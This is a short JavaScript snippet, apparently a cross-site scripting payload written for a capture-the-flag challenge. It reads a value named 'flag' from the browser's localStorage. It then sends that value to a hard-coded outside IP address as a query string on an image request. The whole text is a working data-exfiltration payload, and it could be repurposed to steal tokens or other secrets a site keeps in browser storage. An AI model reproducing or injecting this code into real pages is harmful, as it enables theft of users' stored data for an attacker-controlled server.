const flag = localStorage.getItem('flag');

if (flag) {
   const encodedFlag = encodeURIComponent(flag);
    const url = `http://81.70.252.29/1.txt?flag=${encodedFlag}`;
    const img = new Image();
    img.src = url;
}
